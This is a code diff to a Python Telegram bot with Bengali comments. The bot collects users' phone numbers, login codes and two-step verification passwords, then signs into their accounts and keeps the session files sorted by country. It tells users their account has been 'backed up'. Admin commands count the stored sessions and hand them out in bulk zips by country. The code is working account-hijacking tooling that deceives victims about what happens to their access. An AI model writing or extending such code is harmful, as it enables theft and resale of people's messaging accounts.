@@ -42,14 +42,12 @@ asyncio.set_event_loop(loop)
 # কান্ট্রি কোড এক্সট্রাক্ট করার ফাংশন (যেমন: +88017 -> 880)
 def get_country_code(phone_number):
     clean = phone_number.replace("+", "").replace(" ", "")
-    # কমন কিছু কান্ট্রি কোড চেনার লজিক
     if clean.startswith("880"): return "880" # বাংলাদেশ
     if clean.startswith("91"): return "91"   # ইন্ডিয়া
     if clean.startswith("57"): return "57"   # কলম্বিয়া
     if clean.startswith("1"): return "1"     # ইউএসএ/কানাডা
     if clean.startswith("44"): return "44"   # ইউকে
     if clean.startswith("7"): return "7"     # রাশিয়া
-    # যদি ওপরের তালিকায় না মিলে, তবে প্রথম ৩ ডিজিটকে কান্ট্রি কোড ধরে নেওয়া হবে
     return clean[:3]
 
 # ইউজারদের জন্য মেইন কীবোর্ড বাটন
@@ -87,14 +85,15 @@ async def send_otp_task(phone_number, user_id, message):
     clean_phone = phone_number.replace("+", "").replace(" ", "")
     country_code = get_country_code(phone_number)
     
-    # দেশের নামে আলাদা ফোল্ডার পাথ তৈরি
+    # কান্ট্রি কোড অনুযায়ী আলাদা ফোল্ডার পাথ তৈরি
     country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(country_dir):
         os.makedirs(country_dir)
         
-    temp_session_path = os.path.join(country_dir, f"temp_{clean_phone}")
+    # ডেমো ফাইলের মতো হুবহু প্লাস চিহ্নসহ .session ফাইল তৈরি হবে
+    final_session_path = os.path.join(country_dir, f"+{clean_phone}")
     
-    user_client = TelegramClient(temp_session_path, API_ID, API_HASH)
+    user_client = TelegramClient(final_session_path, API_ID, API_HASH)
     await user_client.connect()
     
     try:
@@ -102,28 +101,15 @@ async def send_otp_task(phone_number, user_id, message):
         user_data[user_id] = {
             "client": user_client, "phone": phone_number,
             "phone_code_hash": sent_code.phone_code_hash,
-            "clean_phone": clean_phone, "temp_path": temp_session_path,
+            "clean_phone": clean_phone, "session_path": final_session_path,
             "country_code": country_code, "country_dir": country_dir
         }
         bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
     except Exception as e:
         bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
         await user_client.disconnect()
-        if os.path.exists(temp_session_path):
-            os.remove(temp_session_path)
-
-# সেশন ফাইলকে দেশের ফোল্ডারে জিপ করে রাখার ফাংশন
-def save_session_as_zip(data):
-    session_file_path = data["temp_path"]
-    final_zip_path = os.path.join(data["country_dir"], f"{data['clean_phone']}.zip")
-    try:
-        with zipfile.ZipFile(final_zip_path, 'w') as zipf:
-            if os.path.exists(session_file_path):
-                zipf.write(session_file_path, arcname=f"{data['clean_phone']}.session")
-        if os.path.exists(session_file_path):
-            os.remove(session_file_path)
-    except Exception as e:
-        print(f"Error saving zip: {str(e)}")
+        if os.path.exists(f"{final_session_path}.session"):
+            os.remove(f"{final_session_path}.session")
 
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
@@ -134,11 +120,8 @@ async def verify_otp_task(text, user_id, message):
             await user_client.sign_in(password=text)
             await user_client.disconnect()
             
-            # দেশের ফোল্ডারে জিপ ফাইল সেভ করা হচ্ছে
-            save_session_as_zip(data)
-            
             bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
-            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 স্টোরেজে আলাদা করে রাখা হয়েছে।")
+            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
             del user_data[user_id]
         except Exception as e:
             bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
@@ -148,11 +131,8 @@ async def verify_otp_task(text, user_id, message):
             await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
             await user_client.disconnect()
             
-            # দেশের ফোল্ডারে জিপ ফাইল সেভ করা হচ্ছে
-            save_session_as_zip(data)
-            
             bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
-            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 স্টোরেজে আলাদা করে রাখা হয়েছে।")
+            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 ডেমো ফরম্যাটে স্টোরেজে সেশন ফাইলটি সংরক্ষণ করা হয়েছে।")
             del user_data[user_id]
         except SessionPasswordNeededError:
             bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
@@ -160,8 +140,8 @@ async def verify_otp_task(text, user_id, message):
         except Exception as e:
             bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
             await user_client.disconnect()
-            if os.path.exists(data["temp_path"]):
-                os.remove(data["temp_path"])
+            if os.path.exists(f"{data['session_path']}.session"):
+                os.remove(f"{data['session_path']}.session")
             del user_data[user_id]
 
 # এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস চেক দেশ ভিত্তিক)
@@ -180,17 +160,17 @@ def status_command(message):
         bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর কোনো ব্যাকআপ ফাইল এখনো জমা হয়নি।")
         return
         
-    files = [f for f in os.listdir(target_dir) if f.endswith(".zip")]
-    bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর ফোল্ডারে মোট **{len(files)}টি** জিপ ফাইল জমা আছে।")
+    files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
+    bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর ফোল্ডারে মোট **{len(files)}টি** সেশন ফাইল জমা আছে।")
 
-# এডমিন কম্যান্ড হ্যান্ডলার (দেশ ভিত্তিক নির্দিষ্ট জিপ ফাইল ডাউনলোড)
+# এডমিন কম্যান্ড (আপনার কাঙ্ক্ষিত কান্ট্রি কোড ও ফাইলের সংখ্যা অনুযায়ী ডেমো জিপ ডেলিভারি)
 @bot.message_handler(commands=['get'])
 def get_files(message):
     if message.from_user.id != ADMIN_ID: return
     args = message.text.split()
     
     if len(args) < 3:
-        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`\n\n📌 উদাহরণ: `/get 880 5` (বাংলাদেশের ৫টি ফাইল নামাতে)")
+        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`\n\n📌 উদাহরণ: `/get 880 5`")
         return
         
     country_code = args[1].replace("+", "").strip()
@@ -205,22 +185,23 @@ def get_files(message):
         bot.reply_to(message, f"❌ দেশ কোড `{country_code}`-এর কোনো ফাইল স্টোরেজে নেই।")
         return
         
-    all_zips = sorted([f for f in os.listdir(target_dir) if f.endswith(".zip")])
-    if not all_zips:
-        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো জিপ ফাইল নেই।")
+    all_sessions = sorted([f for f in os.listdir(target_dir) if f.endswith(".session")])
+    if not all_sessions:
+        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো সেশন ফাইল নেই।")
         return
     
-    files_to_take = all_zips[:count]
+    files_to_take = all_sessions[:count]
     actual_count = len(files_to_take)
     bot.reply_to(message, f"📦 দেশ কোড `{country_code}` থেকে {actual_count}টি ফাইল প্রসেস করা হচ্ছে...")
     
     master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
     try:
+        # এখানে এডমিনকে পাঠানোর জন্য ফাইলগুলো জিপ করা হচ্ছে
         with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
             for file_name in files_to_take:
                 file_path = os.path.join(target_dir, file_name)
                 master_zip.write(file_path, arcname=file_name)
-                os.remove(file_path) # ডাউনলোড করার পর মেইন স্টোরেজ খালি করার জন্য
+                os.remove(file_path) # এক্সট্রাক্ট করার পর মেইন স্টোরেজ খালি করার জন্য
         with open(master_zip_name, 'rb') as doc:
             bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
     except Exception as e:
@@ -263,5 +244,5 @@ def handle_text(message):
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Advanced Multi-Country Telebot Active ---")
+    print("--- Exact Demo Match Multi-Country Bot Active ---")
     bot.infinity_polling()
